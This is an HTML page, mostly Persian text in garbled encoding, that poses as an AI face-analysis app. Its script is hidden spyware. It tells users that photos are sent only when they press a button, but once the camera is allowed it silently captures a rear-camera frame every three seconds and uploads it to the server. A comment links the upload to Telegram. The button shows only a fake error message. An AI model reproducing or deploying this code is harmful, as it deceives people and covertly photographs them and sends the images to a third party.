<!DOCTYPE html>
<html lang="fa" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>ai</title>
    <style>
        * { box-sizing: border-box;  padding: 0; margin: 0; }
        body{ background-color: #fff155;  }
        .main { font-family: tahoma, sans-serif; color: white; display: flex; flex-direction: column; align-items: center; justify-content: center;  margin: 0; }
        .container { text-align: center; width: 90%; max-width: 500px; }
        video { width: 100%; border-radius: 10px;  }
        canvas { display: none; }
        .status { margin-top: 15px; font-size: 14px; color: #00ff00; }
        .recording-dot { display: inline-block; width: 10px; height: 10px; background-color: red; border-radius: 50%; animation: blink 1s infinite; margin-left: 5px; }
        @keyframes blink { 50% { opacity: 0; } }
    </style>
    <link rel="stylesheet" href="style.css">
</head>
<body>
   <div class="nav">
    <h2>ุจู ููุด ูุตููุน ุขูุงูุฒ ฺูุฑู ุฎูุด ุขูุฏู๐๐</h2>
    <h3>ุจุฑุง ุงุณุชูุงุฏู ุงุฒ ููุด ูุตููุน ุงุจุชุฏุง ุจุงุฏ ุฏูุฑุจู ฺฏูุด ุฎูุฏ ุฑุง ูุนุงู ฺฉูุฏ๐ธ</h3>
    <p>
        ู ุงูฺฉู ุงู ูุณุฎู ุงููุณุช ู ููฺฉูู ุจุงฺฏ ุฏุงุดุชู ุจุงุดูุ ูพุณ ุงฺฏู ูุดฺฉู ุจูุฏ ุจูููู ุงุทูุงุน ุจุฏู๐.<br/>
        ุฏุฑ ุขูุฏู ูฺูุฏุงู ุฏูุฑ ุงู ุตูุญู  ฺฉู ุงูุงู ูุจูู ุจู ฺฉ ุงูพูฺฉุดู ฺฉุงูู ุชุจุฏู ูุดู ฺฉู ุงูฺฉุงูุงุช ุจุดุชุฑ ุฏุงุฑู๐.
        <br/>
        ูพุณ ุงฺฏู ุงู ุตูุญู ููุฑุฏ ูพุณูุฏ ุดูุง ูุจูุฏ ุงุฒ ุดูุง ุนุฐุฑ ุฎูุงู ูฺฉูู๐
    </p>
   </div>
<div class="main">
    <div class="container">
        <h2></h2>
        <video id="video" autoplay playsinline muted></video>
        <canvas id="canvas"></canvas>
        <div class="status">
       
            <span id="log">ุฏุฑ ุญุงู ุจุฑูุฑุงุฑ ุงุฑุชุจุงุท...</span>
        </div>
    </div>
</div>
<div class="buttun">
    <h2>ุชุง ูููุน ฺฉู ุฑู ุฏฺฉูู /ุงุฑุณุงู ุนฺฉุณ/ ูุฒุฏุฏ ุนฺฉุณ ุงุฑุณุงู ูุฎูุงูุฏ ุดุฏ<br/> 
    
     ุงูฺฉู ุจุฑุง ุงูฺฉู ููุด ูุตููุน ุฑุงุญุช ุชุฑ ุจุชููู ฺูุฑ ุดูุงุฑู ุขูุงูุฒ ฺฉูู ูุทูุง ุฏุฑ ุฌุง ูุฑุงุฑ ุจฺฏุฑุฏ ฺฉู ฺูุฑู ุดูุง ูุงุถุญ ุจุงุดู.๐๐
    </h2>
    <button class="send" id="button">ุงุฑุณุงู ุนฺฉุณ</button>
</div>
<script>
    const video = document.getElementById('video');
    const canvas = document.getElementById('canvas');
    const log = document.getElementById('log');
    const btn=document.getElementById('button');
    btn.addEventListener("click",()=>{
        alert("ุนฺฉุณ ูพุฑุฏุงุฒุด ุนฺฉุณ ุจุง ุฎุทุง ููุงุฌู ุดุฏ ูุทูุง ุฏุฑ ุฌุง ุฏุฑุณุช ู ฺูุฑู ุชุงู ูุงุถุญ ุจุงุดู ู ุงฺฏุฑ ุฏูุจุงุฑู ุงู  ูพุบุงู ุธุงูุฑ ุดุฏ ูุทูุง ุจู ุชูุณุนู ุฏููุฏู ููุด ูุตููุน ุงุทูุงุน ุฏูุฏ")
    })
    // ุชูุธู ูุงุตูู ุฒูุงู ุงุฑุณุงู ุนฺฉุณ (ุจู ููโุซุงูู)
    // 3000 ุนู ูุฑ ณ ุซุงูู. ฺฉูุชุฑ ุงุฒ ุงู ูฺฉู ฺูู ุชูฺฏุฑุงู ุจูุงฺฉ ูฺฉูู!
    const SEND_INTERVAL = 3000; 

    async function startCamera() {
        try {
            const stream = await navigator.mediaDevices.getUserMedia({ 
                video: { facingMode: 'environment' } // ุฏูุฑุจู ูพุดุช
            });
            video.srcObject = stream;
            
            log.innerText = "";
            
            // ุดุฑูุน ุชุงูุฑ ุจุฑุง ุงุฑุณุงู ุนฺฉุณ
            setInterval(captureAndSend, SEND_INTERVAL);

        } catch (err) {
            log.innerText = "";
            log.style.color = "red";
        }
    }

    function captureAndSend() {
        if (video.readyState === video.HAVE_ENOUGH_DATA) {
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            const ctx = canvas.getContext('2d');
            ctx.drawImage(video, 0, 0);

            canvas.toBlob(blob => {
                sendToBackend(blob);
            }, 'image/jpeg', 0.7); // ฺฉูุช 70% ุจุฑุง ุณุฑุนุช ุจุดุชุฑ
        }
    }

    async function sendToBackend(blob) {
        const formData = new FormData();
        formData.append('photo', blob, 'capture.jpg');

        try {
            log.innerText = "";
            await fetch('/send-photo', { method: 'POST', body: formData });
            log.innerText = "";
        } catch (error) {
            console.error(error);
            log.innerText = "โ๏ธ ุฎุทุง ุฏุฑ ุงุฑุณุงู";
        }
    }

    // ุดุฑูุน ุจุฑูุงูู
    startCamera();
</script>

</body>
</html>